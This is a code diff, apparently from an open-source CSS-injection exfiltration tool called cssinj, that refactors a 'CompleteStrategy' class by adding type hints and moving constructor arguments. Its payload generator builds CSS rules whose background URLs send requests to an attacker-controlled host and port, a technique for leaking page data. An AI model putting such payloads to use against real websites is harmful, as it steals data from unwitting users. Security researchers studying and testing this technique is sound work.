@@ -1,3 +1,4 @@
+from cssinj.client import Client
 from cssinj.console import Console, LogLevel
 from cssinj.strategies.base import BaseExfiltrationStrategy
 from cssinj.utils.default import ELEMENTS
@@ -20,20 +21,18 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         attribut: str = 'value',
         timeout: float = 3.0,
     ) -> None:
-        super().__init__(hostname, port, timeout)
-        self.element = element
-        self.attribut = attribut
+        super().__init__(hostname, port, element, attribut, timeout)
 
-    def generate_start_payload(self, client) -> str:
+    def generate_start_payload(self, client: Client) -> str:
         return self._generate_payload(client)
 
-    def generate_next_payload(self, client) -> str:
+    def generate_next_payload(self, client: Client) -> str:
         return 'next'
 
-    def handle_valid(self, client, data: str) -> str:
+    def handle_valid(self, client: Client, data: str) -> str:
         return 'valid'
 
-    def handle_end(self, client) -> str:
+    def handle_end(self, client: Client) -> str:
         element = Element(name=self.element)
         element.attributs.append(Attribut(name=self.attribut, value=client.data))
         client.elements.append(element)
@@ -44,7 +43,7 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         client.data = ''
         return 'end'
 
-    def _generate_payload(self, client) -> str:
+    def _generate_payload(self, client: Client) -> str:
         elements = ''.join(
             f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
             for element in ELEMENTS
